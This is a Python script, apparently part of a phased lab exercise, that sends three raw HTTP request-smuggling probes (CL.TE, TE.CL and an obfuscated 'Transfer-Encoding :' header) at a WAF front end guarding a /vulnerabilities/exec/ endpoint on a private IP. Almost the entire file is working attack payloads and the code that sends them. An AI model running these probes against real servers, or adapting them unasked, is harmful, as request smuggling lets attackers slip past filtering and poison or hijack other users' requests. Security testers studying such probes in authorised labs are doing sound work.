#!/usr/bin/env python3
"""Phase 6 - CL/TE conflict probes against the WAF front end."""
import socket
import sys

HOST, PORT = (sys.argv[1] if len(sys.argv) > 1 else "192.168.31.86"), 80

PROBES = {
    "CL+TE classic":
        b"POST /vulnerabilities/exec/ HTTP/1.1\r\nHost: lab.local\r\n"
        b"Content-Length: 6\r\nTransfer-Encoding: chunked\r\n"
        b"Connection: close\r\n\r\n0\r\n\r\nG",
    "TE.CL chunked":
        b"POST /vulnerabilities/exec/ HTTP/1.1\r\nHost: lab.local\r\n"
        b"Transfer-Encoding: chunked\r\nContent-Length: 4\r\n"
        b"Connection: close\r\n\r\n"
        b"5c\r\nGPOST / HTTP/1.1\r\n\r\n0\r\n\r\n",
    "TE space-before-colon":
        b"POST /vulnerabilities/exec/ HTTP/1.1\r\nHost: lab.local\r\n"
        b"Content-Length: 6\r\nTransfer-Encoding : chunked\r\n"
        b"Connection: close\r\n\r\n0\r\n\r\nG",
}


def send(raw: bytes) -> bytes:
    with socket.create_connection((HOST, PORT), timeout=10) as s:
        s.sendall(raw)
        s.settimeout(6)
        data = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
        except socket.timeout:
            pass
        return data


if __name__ == "__main__":
    for name, raw in PROBES.items():
        resp = send(raw)
        first = resp.split(b"\r\n", 1)[0].decode("latin-1") or "(no response)"
        print(f"{name:28} -> {first}")
